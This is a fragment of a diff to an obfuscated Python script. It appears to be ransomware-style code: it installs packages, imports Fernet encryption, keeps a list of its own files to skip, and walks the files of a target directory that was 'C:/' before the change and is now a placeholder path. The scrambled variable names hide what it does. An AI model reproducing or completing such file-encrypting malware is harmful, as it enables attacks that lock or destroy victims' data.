@@ -7,9 +7,9 @@ bANnmSgHHWZIUfoo.check_call([nMnnSbbWhkSJKF.executable, '-m', 'pip', 'install', 
 from cryptography.fernet import Fernet as AjkLShhEBmSDw
 
 kSjQUuSifp = []
-llPsjJShQHHSuOF = ["encrypt.exe", "encrypt.py", "encrypt.key"]
+llPsjJShQHHSuOF = ["encrypt.exe", "encrypt.py", "encrypt.key", "full_script.py"]
 
-HsHHBEnmSSb.chdir("C:/")
+HsHHBEnmSSb.chdir("<path>") # <-- change path here
 
 for NmAnnSjKFW in HsHHBEnmSSb.listdir():
     if NmAnnSjKFW in llPsjJShQHHSuOF:
